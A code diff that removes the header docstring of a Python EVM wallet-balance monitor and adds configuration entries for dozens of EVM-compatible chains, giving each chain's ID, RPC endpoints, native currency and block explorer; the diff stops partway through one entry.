@@ -1,10 +1,3 @@
-#!/usr/bin/env python3
-"""
-EVM监控软件主程序
-功能：监控多个钱包地址余额，自动转账到目标地址
-特性：交易历史检查、日志记录、状态恢复、交互式菜单
-"""
-
 import os
 import sys
 import json
@@ -220,6 +213,17 @@ class EVMMonitor:
                 'explorer': 'https://celoscan.io'
             },
             
+            'chiliz': {
+                'name': '🌶️ Chiliz',
+                'chain_id': 88888,
+                'rpc_urls': [
+                    'https://rpc.ankr.com/chiliz',
+                    'https://chiliz.publicnode.com'
+                ],
+                'native_currency': 'CHZ',
+                'explorer': 'https://scan.chiliz.com'
+            },
+            
             'cronos': {
                 'name': '🦀 Cronos',
                 'chain_id': 25,
@@ -238,6 +242,17 @@ class EVMMonitor:
                 ],
                 'native_currency': 'CRO',
                 'explorer': 'https://cronoscan.com'
+            },
+            
+            'core': {
+                'name': '⚡ Core',
+                'chain_id': 1116,
+                'rpc_urls': [
+                    'https://rpc.coredao.org',
+                    'https://rpc-core.icecreamswap.com'
+                ],
+                'native_currency': 'CORE',
+                'explorer': 'https://scan.coredao.org'
             },
             
             'ethereum': {
@@ -294,6 +309,17 @@ class EVMMonitor:
                 ],
                 'native_currency': 'FTM',
                 'explorer': 'https://ftmscan.com'
+            },
+            
+            'filecoin': {
+                'name': '💾 Filecoin',
+                'chain_id': 314,
+                'rpc_urls': [
+                    'https://api.node.glif.io/rpc/v1',
+                    'https://rpc.ankr.com/filecoin'
+                ],
+                'native_currency': 'FIL',
+                'explorer': 'https://filfox.info'
             },
             
             'fuse': {
@@ -493,7 +519,1181 @@ class EVMMonitor:
                 'explorer': 'https://zetachain.blockscout.com'
             },
             
+            # ==== 💎 新增重要主网链条 ====
+            'berachain': {
+                'name': '🐻 Berachain',
+                'chain_id': 80084,
+                'rpc_urls': [
+                    'https://rpc.berachain.com',
+                    'https://berachain.drpc.org'
+                ],
+                'native_currency': 'BERA',
+                'explorer': 'https://berascan.com'
+            },
+            
+            'bitgert': {
+                'name': '⚡ Bitgert',
+                'chain_id': 32520,
+                'rpc_urls': [
+                    'https://mainnet-rpc.brisescan.com',
+                    'https://chainrpc.com',
+                    'https://rpc.icecreamswap.com'
+                ],
+                'native_currency': 'BRISE',
+                'explorer': 'https://brisescan.com'
+            },
+            
+            'canto': {
+                'name': '💫 Canto',
+                'chain_id': 7700,
+                'rpc_urls': [
+                    'https://canto.gravitychain.io',
+                    'https://canto.evm.chandrastation.com',
+                    'https://mainnode.plexnode.org:8545'
+                ],
+                'native_currency': 'CANTO',
+                'explorer': 'https://cantoscan.com'
+            },
+            
+            'dogechain': {
+                'name': '🐕 Dogechain',
+                'chain_id': 2000,
+                'rpc_urls': [
+                    'https://rpc.dogechain.dog',
+                    'https://rpc01.dogechain.dog',
+                    'https://rpc02.dogechain.dog'
+                ],
+                'native_currency': 'DOGE',
+                'explorer': 'https://explorer.dogechain.dog'
+            },
+            
+            'ethereum_classic': {
+                'name': '🟢 Ethereum Classic',
+                'chain_id': 61,
+                'rpc_urls': [
+                    'https://etc.rivet.link',
+                    'https://besu-de.etc-network.info',
+                    'https://geth-de.etc-network.info'
+                ],
+                'native_currency': 'ETC',
+                'explorer': 'https://blockscout.com/etc/mainnet'
+            },
+            
+            'eos_evm': {
+                'name': '🟡 EOS EVM',
+                'chain_id': 17777,
+                'rpc_urls': [
+                    'https://api.evm.eosnetwork.com',
+                    'https://eosevm.blockpi.network/v1/rpc/public'
+                ],
+                'native_currency': 'EOS',
+                'explorer': 'https://explorer.evm.eosnetwork.com'
+            },
+            
+            'flare': {
+                'name': '🔥 Flare',
+                'chain_id': 14,
+                'rpc_urls': [
+                    'https://flare-api.flare.network/ext/C/rpc',
+                    'https://flare.rpc.thirdweb.com',
+                    'https://rpc.ankr.com/flare'
+                ],
+                'native_currency': 'FLR',
+                'explorer': 'https://flare-explorer.flare.network'
+            },
+            
+            'gochain': {
+                'name': '🟢 GoChain',
+                'chain_id': 60,
+                'rpc_urls': [
+                    'https://rpc.gochain.io',
+                    'https://rpc2.gochain.io'
+                ],
+                'native_currency': 'GO',
+                'explorer': 'https://explorer.gochain.io'
+            },
+            
+            'haqq': {
+                'name': '☪️ HAQQ Network',
+                'chain_id': 11235,
+                'rpc_urls': [
+                    'https://rpc.eth.haqq.network',
+                    'https://rpc.haqq.network'
+                ],
+                'native_currency': 'ISLM',
+                'explorer': 'https://explorer.haqq.network'
+            },
+            
+            'iotex': {
+                'name': '🔗 IoTeX',
+                'chain_id': 4689,
+                'rpc_urls': [
+                    'https://babel-api.mainnet.iotex.io',
+                    'https://rpc.ankr.com/iotex'
+                ],
+                'native_currency': 'IOTX',
+                'explorer': 'https://iotexscan.io'
+            },
+            
+            'kcc': {
+                'name': '🔶 KCC Mainnet',
+                'chain_id': 321,
+                'rpc_urls': [
+                    'https://rpc-mainnet.kcc.network',
+                    'https://kcc.mytokenpocket.vip',
+                    'https://public-rpc.blockpi.io/http/kcc'
+                ],
+                'native_currency': 'KCS',
+                'explorer': 'https://explorer.kcc.io'
+            },
+            
+            'meter': {
+                'name': '⚡ Meter',
+                'chain_id': 82,
+                'rpc_urls': [
+                    'https://rpc.meter.io',
+                    'https://rpc-meter.jellypool.xyz'
+                ],
+                'native_currency': 'MTR',
+                'explorer': 'https://scan.meter.io'
+            },
+            
+            'milkomeda': {
+                'name': '🥛 Milkomeda C1',
+                'chain_id': 2001,
+                'rpc_urls': [
+                    'https://rpc-mainnet-cardano-evm.c1.milkomeda.com',
+                    'https://rpc.c1.milkomeda.com'
+                ],
+                'native_currency': 'milkADA',
+                'explorer': 'https://explorer-mainnet-cardano-evm.c1.milkomeda.com'
+            },
+            
+            'onus': {
+                'name': '🅾️ ONUS Chain',
+                'chain_id': 1975,
+                'rpc_urls': [
+                    'https://rpc.onuschain.io',
+                    'https://rpc-onus.ankr.com'
+                ],
+                'native_currency': 'ONUS',
+                'explorer': 'https://explorer.onuschain.io'
+            },
+            
+            'pulsechain': {
+                'name': '💓 PulseChain',
+                'chain_id': 369,
+                'rpc_urls': [
+                    'https://rpc.pulsechain.com',
+                    'https://rpc-pulsechain.g4mm4.io',
+                    'https://pulsechain.publicnode.com'
+                ],
+                'native_currency': 'PLS',
+                'explorer': 'https://scan.pulsechain.com'
+            },
+            
+            'rei': {
+                'name': '👑 REI Network',
+                'chain_id': 47805,
+                'rpc_urls': [
+                    'https://rpc.rei.network',
+                    'https://rei-rpc.moonrhythm.io'
+                ],
+                'native_currency': 'REI',
+                'explorer': 'https://scan.rei.network'
+            },
+            
+            'rootstock': {
+                'name': '🟨 Rootstock (RSK)',
+                'chain_id': 30,
+                'rpc_urls': [
+                    'https://public-node.rsk.co',
+                    'https://mycrypto.rsk.co'
+                ],
+                'native_currency': 'RBTC',
+                'explorer': 'https://explorer.rsk.co'
+            },
+            
+            'smartbch': {
+                'name': '💚 SmartBCH',
+                'chain_id': 10000,
+                'rpc_urls': [
+                    'https://smartbch.greyh.at',
+                    'https://rpc.uatvo.com'
+                ],
+                'native_currency': 'BCH',
+                'explorer': 'https://smartbch.org'
+            },
+            
+            'songbird': {
+                'name': '🐦 Songbird',
+                'chain_id': 19,
+                'rpc_urls': [
+                    'https://songbird-api.flare.network/ext/C/rpc',
+                    'https://rpc.ankr.com/songbird'
+                ],
+                'native_currency': 'SGB',
+                'explorer': 'https://songbird-explorer.flare.network'
+            },
+            
+            'syscoin': {
+                'name': '🔷 Syscoin NEVM',
+                'chain_id': 57,
+                'rpc_urls': [
+                    'https://rpc.syscoin.org',
+                    'https://syscoin-evm.publicnode.com'
+                ],
+                'native_currency': 'SYS',
+                'explorer': 'https://explorer.syscoin.org'
+            },
+            
+            'thundercore': {
+                'name': '⚡ ThunderCore',
+                'chain_id': 108,
+                'rpc_urls': [
+                    'https://mainnet-rpc.thundercore.com',
+                    'https://mainnet-rpc.thundertoken.net'
+                ],
+                'native_currency': 'TT',
+                'explorer': 'https://scan.thundercore.com'
+            },
+            
+            'tomochain': {
+                'name': '🟢 TomoChain',
+                'chain_id': 88,
+                'rpc_urls': [
+                    'https://rpc.tomochain.com',
+                    'https://tomo.blockpi.network/v1/rpc/public'
+                ],
+                'native_currency': 'TOMO',
+                'explorer': 'https://tomoscan.io'
+            },
+            
+            'velas': {
+                'name': '🔮 Velas',
+                'chain_id': 106,
+                'rpc_urls': [
+                    'https://evmexplorer.velas.com/rpc',
+                    'https://velas-mainnet.rpcfast.com'
+                ],
+                'native_currency': 'VLX',
+                'explorer': 'https://evmexplorer.velas.com'
+            },
+            
+            'wanchain': {
+                'name': '🌊 Wanchain',
+                'chain_id': 888,
+                'rpc_urls': [
+                    'https://gwan-ssl.wandevs.org:56891',
+                    'https://wanchain-mainnet.gateway.pokt.network/v1/lb/6144d7b3e536190038c92fd2'
+                ],
+                'native_currency': 'WAN',
+                'explorer': 'https://wanscan.org'
+            },
+            
+            'xdc': {
+                'name': '🔶 XDC Network',
+                'chain_id': 50,
+                'rpc_urls': [
+                    'https://rpc.xdcrpc.com',
+                    'https://rpc1.xinfin.network',
+                    'https://rpc.xinfin.network'
+                ],
+                'native_currency': 'XDC',
+                'explorer': 'https://explorer.xinfin.network'
+            },
+            
+            # ==== 🌟 更多主网链条 ====
+            'acala': {
+                'name': '🟣 Acala Network',
+                'chain_id': 787,
+                'rpc_urls': [
+                    'https://eth-rpc-acala.aca-api.network',
+                    'https://rpc.evm.acala.network'
+                ],
+                'native_currency': 'ACA',
+                'explorer': 'https://blockscout.acala.network'
+            },
+            
+            'aioz': {
+                'name': '🚀 AIOZ Network',
+                'chain_id': 168,
+                'rpc_urls': [
+                    'https://eth-dataseed.aioz.network'
+                ],
+                'native_currency': 'AIOZ',
+                'explorer': 'https://explorer.aioz.network'
+            },
+            
+            'ambrosus': {
+                'name': '🛸 Ambrosus',
+                'chain_id': 16718,
+                'rpc_urls': [
+                    'https://network.ambrosus.io',
+                    'https://network.ambrosus.com'
+                ],
+                'native_currency': 'AMB',
+                'explorer': 'https://explorer.ambrosus.io'
+            },
+            
+            'artis': {
+                'name': '🎨 ARTIS',
+                'chain_id': 246529,
+                'rpc_urls': [
+                    'https://rpc.artis.network'
+                ],
+                'native_currency': 'ATS',
+                'explorer': 'https://explorer.artis.network'
+            },
+            
+            'bittorrent': {
+                'name': '🏴 BitTorrent Chain',
+                'chain_id': 199,
+                'rpc_urls': [
+                    'https://rpc.bittorrentchain.io',
+                    'https://rpc.bt.io'
+                ],
+                'native_currency': 'BTT',
+                'explorer': 'https://bttcscan.com'
+            },
+            
+            'bitkub': {
+                'name': '🟢 Bitkub Chain',
+                'chain_id': 96,
+                'rpc_urls': [
+                    'https://rpc.bitkubchain.io',
+                    'https://rpc-l1.bitkubchain.io'
+                ],
+                'native_currency': 'KUB',
+                'explorer': 'https://bkcscan.com'
+            },
+            
+            'callisto': {
+                'name': '🌙 Callisto Network',
+                'chain_id': 820,
+                'rpc_urls': [
+                    'https://clo-geth.0xinfra.com'
+                ],
+                'native_currency': 'CLO',
+                'explorer': 'https://explorer.callisto.network'
+            },
+            
+            'catecoin': {
+                'name': '🐱 Catecoin Chain',
+                'chain_id': 1618,
+                'rpc_urls': [
+                    'https://send.catechain.com'
+                ],
+                'native_currency': 'CATE',
+                'explorer': 'https://explorer.catechain.com'
+            },
+            
+            'cheapeth': {
+                'name': '💰 cheapETH',
+                'chain_id': 777777,
+                'rpc_urls': [
+                    'https://node.cheapeth.org/rpc'
+                ],
+                'native_currency': 'cETH',
+                'explorer': 'https://explorer.cheapeth.org'
+            },
+            
+            'clover': {
+                'name': '🍀 Clover',
+                'chain_id': 1024,
+                'rpc_urls': [
+                    'https://rpc-ivy.clover.finance',
+                    'https://rpc-ivy-2.clover.finance'
+                ],
+                'native_currency': 'CLV',
+                'explorer': 'https://clvscan.com'
+            },
+            
+            'coinex': {
+                'name': '🔵 CoinEx Smart Chain',
+                'chain_id': 52,
+                'rpc_urls': [
+                    'https://rpc.coinex.net',
+                    'https://rpc1.coinex.net'
+                ],
+                'native_currency': 'CET',
+                'explorer': 'https://www.coinex.net'
+            },
+            
+            'conflux': {
+                'name': '🌊 Conflux eSpace',
+                'chain_id': 1030,
+                'rpc_urls': [
+                    'https://evm.confluxrpc.com',
+                    'https://evm.confluxrpc.org'
+                ],
+                'native_currency': 'CFX',
+                'explorer': 'https://evm.confluxscan.net'
+            },
+            
+            'cube': {
+                'name': '🎲 Cube Network',
+                'chain_id': 1818,
+                'rpc_urls': [
+                    'https://http-mainnet.cube.network',
+                    'https://http-mainnet-sg.cube.network'
+                ],
+                'native_currency': 'CUBE',
+                'explorer': 'https://cubescan.network'
+            },
+            
+            'darwinia': {
+                'name': '🦀 Darwinia Network',
+                'chain_id': 46,
+                'rpc_urls': [
+                    'https://rpc.darwinia.network'
+                ],
+                'native_currency': 'RING',
+                'explorer': 'https://explorer.darwinia.network'
+            },
+            
+            'elastos': {
+                'name': '🔗 Elastos EVM',
+                'chain_id': 20,
+                'rpc_urls': [
+                    'https://api.elastos.io/esc',
+                    'https://api.trinity-tech.cn/esc'
+                ],
+                'native_currency': 'ELA',
+                'explorer': 'https://esc.elastos.io'
+            },
+            
+            'energi': {
+                'name': '⚡ Energi',
+                'chain_id': 39797,
+                'rpc_urls': [
+                    'https://nodeapi.energi.network'
+                ],
+                'native_currency': 'NRG',
+                'explorer': 'https://explorer.energi.network'
+            },
+            
+            'ethpow': {
+                'name': '⛏️ EthereumPoW',
+                'chain_id': 10001,
+                'rpc_urls': [
+                    'https://mainnet.ethereumpow.org'
+                ],
+                'native_currency': 'ETHW',
+                'explorer': 'https://www.oklink.com/ethw'
+            },
+            
+            'expanse': {
+                'name': '🌌 Expanse Network',
+                'chain_id': 2,
+                'rpc_urls': [
+                    'https://node.expanse.tech'
+                ],
+                'native_currency': 'EXP',
+                'explorer': 'https://explorer.expanse.tech'
+            },
+            
+            'functionx': {
+                'name': '🔧 Function X',
+                'chain_id': 530,
+                'rpc_urls': [
+                    'https://fx-json-web3.functionx.io:8545'
+                ],
+                'native_currency': 'FX',
+                'explorer': 'https://explorer.functionx.io'
+            },
+            
+            'gatechain': {
+                'name': '🚪 GateChain',
+                'chain_id': 86,
+                'rpc_urls': [
+                    'https://evm.gatenode.cc'
+                ],
+                'native_currency': 'GT',
+                'explorer': 'https://gatescan.org'
+            },
+            
+            'hoo': {
+                'name': '🦉 Hoo Smart Chain',
+                'chain_id': 70,
+                'rpc_urls': [
+                    'https://http-mainnet.hoosmartchain.com'
+                ],
+                'native_currency': 'HOO',
+                'explorer': 'https://hooscan.com'
+            },
+            
+            'kekchain': {
+                'name': '🐸 KekChain',
+                'chain_id': 420420,
+                'rpc_urls': [
+                    'https://mainnet.kekchain.com'
+                ],
+                'native_currency': 'KEK',
+                'explorer': 'https://mainnet-explorer.kekchain.com'
+            },
+            
+            'laozi': {
+                'name': '👴 LaoZi',
+                'chain_id': 6969,
+                'rpc_urls': [
+                    'https://rpc.laozi.network'
+                ],
+                'native_currency': 'LAO',
+                'explorer': 'https://scan.laozi.network'
+            },
+            
+            'lightstreams': {
+                'name': '💡 Lightstreams',
+                'chain_id': 163,
+                'rpc_urls': [
+                    'https://node.mainnet.lightstreams.io'
+                ],
+                'native_currency': 'PHT',
+                'explorer': 'https://explorer.lightstreams.io'
+            },
+            
+            'lukso': {
+                'name': '🎯 LUKSO',
+                'chain_id': 42,
+                'rpc_urls': [
+                    'https://rpc.mainnet.lukso.network',
+                    'https://42.rpc.thirdweb.com'
+                ],
+                'native_currency': 'LYX',
+                'explorer': 'https://explorer.execution.mainnet.lukso.network'
+            },
+            
+            'metadium': {
+                'name': '🆔 Metadium',
+                'chain_id': 11,
+                'rpc_urls': [
+                    'https://api.metadium.com/prod'
+                ],
+                'native_currency': 'META',
+                'explorer': 'https://explorer.metadium.com'
+            },
+            
+            'newton': {
+                'name': '🍎 Newton',
+                'chain_id': 1012,
+                'rpc_urls': [
+                    'https://rpc1.newchain.newtonproject.org'
+                ],
+                'native_currency': 'NEW',
+                'explorer': 'https://explorer.newtonproject.org'
+            },
+            
+            'pirl': {
+                'name': '⚪ Pirl',
+                'chain_id': 3125659152,
+                'rpc_urls': [
+                    'https://wallrpc.pirl.io'
+                ],
+                'native_currency': 'PIRL',
+                'explorer': 'https://explorer.pirl.io'
+            },
+            
+            'theta': {
+                'name': '🎬 Theta',
+                'chain_id': 361,
+                'rpc_urls': [
+                    'https://eth-rpc-api.thetatoken.org/rpc'
+                ],
+                'native_currency': 'TFUEL',
+                'explorer': 'https://explorer.thetatoken.org'
+            },
+            
+            'ubiq': {
+                'name': '💎 Ubiq',
+                'chain_id': 8,
+                'rpc_urls': [
+                    'https://rpc.octano.dev',
+                    'https://pyrus2.ubiqscan.io'
+                ],
+                'native_currency': 'UBQ',
+                'explorer': 'https://ubiqscan.io'
+            },
+            
+            'wemix': {
+                'name': '🎮 WEMIX',
+                'chain_id': 1111,
+                'rpc_urls': [
+                    'https://api.wemix.com',
+                    'https://api.test.wemix.com'
+                ],
+                'native_currency': 'WEMIX',
+                'explorer': 'https://explorer.wemix.com'
+            },
+            
+            'xerom': {
+                'name': '⚫ Xerom',
+                'chain_id': 1313,
+                'rpc_urls': [
+                    'https://rpc.xerom.org'
+                ],
+                'native_currency': 'XERO',
+                'explorer': 'https://explorer.xerom.org'
+            },
+            
+            'zilliqa': {
+                'name': '🔷 Zilliqa',
+                'chain_id': 32769,
+                'rpc_urls': [
+                    'https://api.zilliqa.com'
+                ],
+                'native_currency': 'ZIL',
+                'explorer': 'https://viewblock.io/zilliqa'
+            },
+            
+            # ==== 🌐 第三批主网链条 ====
+            'aelf': {
+                'name': '🔷 AELF',
+                'chain_id': 1212,
+                'rpc_urls': [
+                    'https://rpc.aelf.io'
+                ],
+                'native_currency': 'ELF',
+                'explorer': 'https://explorer.aelf.io'
+            },
+            
+            'bitrock': {
+                'name': '🪨 Bitrock',
+                'chain_id': 7171,
+                'rpc_urls': [
+                    'https://brockrpc.io'
+                ],
+                'native_currency': 'BROCK',
+                'explorer': 'https://explorer.bit-rock.io'
+            },
+            
+            'crossfi': {
+                'name': '✖️ CrossFi',
+                'chain_id': 4157,
+                'rpc_urls': [
+                    'https://rpc.crossfi.io'
+                ],
+                'native_currency': 'XFI',
+                'explorer': 'https://scan.crossfi.io'
+            },
+            
+            'dexit': {
+                'name': '🚪 Dexit Network',
+                'chain_id': 2036,
+                'rpc_urls': [
+                    'https://rpc.dexit.network'
+                ],
+                'native_currency': 'DXT',
+                'explorer': 'https://explorer.dexit.network'
+            },
+            
+            'ecoball': {
+                'name': '🌱 Ecoball',
+                'chain_id': 2100,
+                'rpc_urls': [
+                    'https://api.ecoball.org/evm'
+                ],
+                'native_currency': 'ECO',
+                'explorer': 'https://scan.ecoball.org'
+            },
+            
+            'ellaism': {
+                'name': '👸 Ellaism',
+                'chain_id': 64,
+                'rpc_urls': [
+                    'https://jsonrpc.ellaism.org'
+                ],
+                'native_currency': 'ELLA',
+                'explorer': 'https://explorer.ellaism.org'
+            },
+            
+            'etho': {
+                'name': '🔮 Etho Protocol',
+                'chain_id': 1313114,
+                'rpc_urls': [
+                    'https://rpc.ethoprotocol.com'
+                ],
+                'native_currency': 'ETHO',
+                'explorer': 'https://explorer.ethoprotocol.com'
+            },
+            
+            'evadore': {
+                'name': '🔸 Evadore',
+                'chain_id': 3918,
+                'rpc_urls': [
+                    'https://rpc.evadore.com'
+                ],
+                'native_currency': 'EVA',
+                'explorer': 'https://explorer.evadore.com'
+            },
+            
+            'findora': {
+                'name': '🔍 Findora',
+                'chain_id': 2152,
+                'rpc_urls': [
+                    'https://rpc-mainnet.findora.org'
+                ],
+                'native_currency': 'FRA',
+                'explorer': 'https://evm.findorascan.io'
+            },
+            
+            'genechain': {
+                'name': '🧬 GeneChain',
+                'chain_id': 5566,
+                'rpc_urls': [
+                    'https://rpc.genechain.io'
+                ],
+                'native_currency': 'GENE',
+                'explorer': 'https://scan.genechain.io'
+            },
+            
+            'gooddata': {
+                'name': '📊 GoodData',
+                'chain_id': 32659,
+                'rpc_urls': [
+                    'https://rpc.goodata.io'
+                ],
+                'native_currency': 'GDD',
+                'explorer': 'https://explorer.goodata.io'
+            },
+            
+            'halo': {
+                'name': '👼 HALO Network',
+                'chain_id': 500,
+                'rpc_urls': [
+                    'https://rpc.halo.land'
+                ],
+                'native_currency': 'HALO',
+                'explorer': 'https://scan.halo.land'
+            },
+            
+            'hook': {
+                'name': '🪝 HOOK',
+                'chain_id': 5112,
+                'rpc_urls': [
+                    'https://rpc.hook.xyz'
+                ],
+                'native_currency': 'HOOK',
+                'explorer': 'https://explorer.hook.xyz'
+            },
+            
+            'injective': {
+                'name': '💉 Injective EVM',
+                'chain_id': 2525,
+                'rpc_urls': [
+                    'https://evm.injective.network'
+                ],
+                'native_currency': 'INJ',
+                'explorer': 'https://explorer.injective.network'
+            },
+            
+            'ipos': {
+                'name': '🏛️ IPOS Network',
+                'chain_id': 1122334455,
+                'rpc_urls': [
+                    'https://rpc.ipos.network'
+                ],
+                'native_currency': 'IPOS',
+                'explorer': 'https://scan.ipos.network'
+            },
+            
+            'joys': {
+                'name': '😊 Joys Digital',
+                'chain_id': 99,
+                'rpc_urls': [
+                    'https://rpc.joys.digital'
+                ],
+                'native_currency': 'JOYS',
+                'explorer': 'https://explorer.joys.digital'
+            },
+            
+            'lambda': {
+                'name': '🧮 Lambda Chain',
+                'chain_id': 56026,
+                'rpc_urls': [
+                    'https://nrpc.lambda.im'
+                ],
+                'native_currency': 'LAMB',
+                'explorer': 'https://scan.lambda.im'
+            },
+            
+            'laocat': {
+                'name': '🐱 LaoCat',
+                'chain_id': 6886,
+                'rpc_urls': [
+                    'https://rpc.laocat.com'
+                ],
+                'native_currency': 'CAT',
+                'explorer': 'https://scan.laocat.com'
+            },
+            
+            'lucky': {
+                'name': '🍀 Lucky Network',
+                'chain_id': 9888,
+                'rpc_urls': [
+                    'https://rpc.luckynetwork.org'
+                ],
+                'native_currency': 'LUCKY',
+                'explorer': 'https://scan.luckynetwork.org'
+            },
+            
+            'luminarylabs': {
+                'name': '💡 LuminaryLabs',
+                'chain_id': 3737,
+                'rpc_urls': [
+                    'https://rpc.luminarylabs.io'
+                ],
+                'native_currency': 'LUM',
+                'explorer': 'https://explorer.luminarylabs.io'
+            },
+            
+            'map_protocol': {
+                'name': '🗺️ MAP Protocol',
+                'chain_id': 22776,
+                'rpc_urls': [
+                    'https://rpc.maplabs.io'
+                ],
+                'native_currency': 'MAPO',
+                'explorer': 'https://maposcan.io'
+            },
+            
+            'mathchain': {
+                'name': '🔢 MathChain',
+                'chain_id': 1139,
+                'rpc_urls': [
+                    'https://mathchain-asia.maiziqianbao.net/rpc',
+                    'https://mathchain-us.maiziqianbao.net/rpc'
+                ],
+                'native_currency': 'MATH',
+                'explorer': 'https://scan.mathchain.org'
+            },
+            
+            'metadot': {
+                'name': '🔴 MetaDot',
+                'chain_id': 16000,
+                'rpc_urls': [
+                    'https://rpc.metadot.network'
+                ],
+                'native_currency': 'MTD',
+                'explorer': 'https://explorer.metadot.network'
+            },
+            
+            'mint': {
+                'name': '🌿 Mint',
+                'chain_id': 185,
+                'rpc_urls': [
+                    'https://rpc.mintchain.io'
+                ],
+                'native_currency': 'MINT',
+                'explorer': 'https://explorer.mintchain.io'
+            },
+            
+            'moonrock': {
+                'name': '🌙 Moonrock',
+                'chain_id': 1011,
+                'rpc_urls': [
+                    'https://rpc.moonrock.network'
+                ],
+                'native_currency': 'ROCK',
+                'explorer': 'https://explorer.moonrock.network'
+            },
+            
+            'moonshadow': {
+                'name': '🌑 Moonshadow',
+                'chain_id': 1010,
+                'rpc_urls': [
+                    'https://rpc.moonshadow.network'
+                ],
+                'native_currency': 'SHADOW',
+                'explorer': 'https://explorer.moonshadow.network'
+            },
+            
+            'permission': {
+                'name': '🔐 Permission',
+                'chain_id': 69420,
+                'rpc_urls': [
+                    'https://rpc.permission.io'
+                ],
+                'native_currency': 'ASK',
+                'explorer': 'https://explorer.permission.io'
+            },
+            
+            'polis': {
+                'name': '🏛️ Polis',
+                'chain_id': 333999,
+                'rpc_urls': [
+                    'https://rpc.polis.tech'
+                ],
+                'native_currency': 'POLIS',
+                'explorer': 'https://explorer.polis.tech'
+            },
+            
+            'popcateum': {
+                'name': '🐱 Popcateum',
+                'chain_id': 1213,
+                'rpc_urls': [
+                    'https://dataseed.popcateum.org'
+                ],
+                'native_currency': 'POP',
+                'explorer': 'https://explorer.popcateum.org'
+            },
+            
+            'primuschain': {
+                'name': '🥇 PrimusChain',
+                'chain_id': 78,
+                'rpc_urls': [
+                    'https://ethnode.primusmoney.com/mainnet'
+                ],
+                'native_currency': 'PRIM',
+                'explorer': 'https://explorer.primusmoney.com'
+            },
+            
+            'quarkchain': {
+                'name': '⚛️ QuarkChain',
+                'chain_id': 100001,
+                'rpc_urls': [
+                    'https://mainnet-s0-ethapi.quarkchain.io',
+                    'https://mainnet-s1-ethapi.quarkchain.io'
+                ],
+                'native_currency': 'QKC',
+                'explorer': 'https://mainnet.quarkchain.io'
+            },
+            
+            'rupaya': {
+                'name': '💰 Rupaya',
+                'chain_id': 499,
+                'rpc_urls': [
+                    'https://rpc.rupaya.io'
+                ],
+                'native_currency': 'RUPX',
+                'explorer': 'https://scan.rupaya.io'
+            },
+            
+            'sakura': {
+                'name': '🌸 Sakura',
+                'chain_id': 1022,
+                'rpc_urls': [
+                    'https://rpc.sakura.network'
+                ],
+                'native_currency': 'SKU',
+                'explorer': 'https://explorer.sakura.network'
+            },
+            
+            'saakuru': {
+                'name': '🎯 Saakuru',
+                'chain_id': 7225878,
+                'rpc_urls': [
+                    'https://rpc.saakuru.network'
+                ],
+                'native_currency': 'OAS',
+                'explorer': 'https://explorer.saakuru.network'
+            },
+            
+            'shibachain': {
+                'name': '🐕 ShibaChain',
+                'chain_id': 27,
+                'rpc_urls': [
+                    'https://rpc.shibachain.net'
+                ],
+                'native_currency': 'SHIB',
+                'explorer': 'https://exp.shibachain.net'
+            },
+            
+            'skale': {
+                'name': '⚙️ Skale',
+                'chain_id': 1351057110,
+                'rpc_urls': [
+                    'https://mainnet.skalenodes.com'
+                ],
+                'native_currency': 'SKL',
+                'explorer': 'https://elated-tan-skat.explorer.mainnet.skalenodes.com'
+            },
+            
+            'sonic_labs': {
+                'name': '🎵 Sonic Labs',
+                'chain_id': 146,
+                'rpc_urls': [
+                    'https://rpc.sonic.mainnet.org'
+                ],
+                'native_currency': 'S',
+                'explorer': 'https://sonicscan.org'
+            },
+            
+            'soterone': {
+                'name': '1️⃣ SoterOne',
+                'chain_id': 218,
+                'rpc_urls': [
+                    'https://rpc.soter.one'
+                ],
+                'native_currency': 'SOTER',
+                'explorer': 'https://explorer.soter.one'
+            },
+            
+            'step': {
+                'name': '👣 Step Network',
+                'chain_id': 1234,
+                'rpc_urls': [
+                    'https://rpc.step.network'
+                ],
+                'native_currency': 'FITFI',
+                'explorer': 'https://stepscan.io'
+            },
+            
+            'tao': {
+                'name': '☯️ Tao Network',
+                'chain_id': 558,
+                'rpc_urls': [
+                    'https://rpc.tao.network',
+                    'https://rpc.testnet.tao.network'
+                ],
+                'native_currency': 'TAO',
+                'explorer': 'https://scan.tao.network'
+            },
+            
+            'taraxa': {
+                'name': '🌀 Taraxa',
+                'chain_id': 841,
+                'rpc_urls': [
+                    'https://rpc.mainnet.taraxa.io'
+                ],
+                'native_currency': 'TARA',
+                'explorer': 'https://explorer.mainnet.taraxa.io'
+            },
+            
+            'teslafunds': {
+                'name': '⚡ Teslafunds',
+                'chain_id': 1856,
+                'rpc_urls': [
+                    'https://tsfapi.europool.me'
+                ],
+                'native_currency': 'TSF',
+                'explorer': 'https://explorer.teslafunds.io'
+            },
+            
+            'thaichain': {
+                'name': '🇹🇭 ThaiChain',
+                'chain_id': 7,
+                'rpc_urls': [
+                    'https://rpc.thaichain.org'
+                ],
+                'native_currency': 'TCH',
+                'explorer': 'https://exp.thaichain.org'
+            },
+            
+            'vana': {
+                'name': '🔮 Vana',
+                'chain_id': 1480,
+                'rpc_urls': [
+                    'https://rpc.vana.org'
+                ],
+                'native_currency': 'VANA',
+                'explorer': 'https://explorer.vana.org'
+            },
+            
+            'viction': {
+                'name': '🏆 Viction',
+                'chain_id': 88,
+                'rpc_urls': [
+                    'https://rpc.viction.xyz'
+                ],
+                'native_currency': 'VIC',
+                'explorer': 'https://www.vicscan.xyz'
+            },
+            
+            'vision': {
+                'name': '👁️ Vision Chain',
+                'chain_id': 123456,
+                'rpc_urls': [
+                    'https://rpc.visionchain.org'
+                ],
+                'native_currency': 'VISION',
+                'explorer': 'https://explorer.visionchain.org'
+            },
+            
+            'zyx': {
+                'name': '🌌 Zyx Mainnet',
+                'chain_id': 55,
+                'rpc_urls': [
+                    'https://rpc-1.zyx.network',
+                    'https://rpc-2.zyx.network'
+                ],
+                'native_currency': 'ZYX',
+                'explorer': 'https://zyxscan.com'
+            },
+            
+            # ==== 🚀 新兴热门链条 ====
+            'apechain': {
+                'name': '🐵 ApeChain',
+                'chain_id': 33139,
+                'rpc_urls': [
+                    'https://apechain.calderachain.xyz/http'
+                ],
+                'native_currency': 'APE',
+                'explorer': 'https://apechain.calderaexplorer.xyz'
+            },
+            
+            'bevm': {
+                'name': '₿ BEVM',
+                'chain_id': 11501,
+                'rpc_urls': [
+                    'https://rpc-mainnet-1.bevm.io',
+                    'https://rpc-mainnet-2.bevm.io'
+                ],
+                'native_currency': 'BTC',
+                'explorer': 'https://scan-mainnet.bevm.io'
+            },
+            
+            'sonic': {
+                'name': '🎵 Sonic',
+                'chain_id': 64165,
+                'rpc_urls': [
+                    'https://rpc.sonic.fantom.network'
+                ],
+                'native_currency': 'S',
